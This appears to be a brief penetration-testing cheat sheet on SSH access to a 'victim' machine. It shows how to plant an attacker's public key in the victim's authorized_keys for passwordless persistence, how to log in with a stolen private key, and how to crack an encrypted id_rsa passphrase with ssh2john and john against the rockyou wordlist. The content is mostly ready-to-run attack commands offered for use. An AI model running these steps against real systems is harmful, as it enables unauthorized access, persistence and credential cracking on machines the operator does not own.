

#### Login via SSH without any password 
###### Generate SSH key
1st Step:
Do this same thing Both victim and attacker system for generate RSA key
```
ssh-keygen -t rsa
```

2nd Step:
Copy the public key from attacker machine and pest the public key inside a file called `authorized_keys` on victim machine 
```
nano authorized_keys
```

###### Now try to connect via SSH without any key
3rd step:
```
# New machines  
ssh user@<victim_ip> 

# Old machines 
ssh user@<victim_ip> -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa
```


Optional:
```
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
```
This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.


#### Login via SSH if you have victim SSH Private key

If you have victim system shell then just copy `ssh_private key` 

Then give permission to the file 
```
chmod 600 id_rsa
```

Command for build connection:
```
ssh user@<victim_IP> -i id_rsa 
```



###### If `id_rsa` file is encrypted so we need to decrypted at first, but for decryption we need pass_fraze , that moment we will use `ssh2john`
```
# 1. Convert
ssh2john ~/.ssh/id_rsa > /tmp/id_rsa.hash

# 2. Crack
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/id_rsa.hash

# 3. Show result
john --show /tmp/id_rsa.hash
```



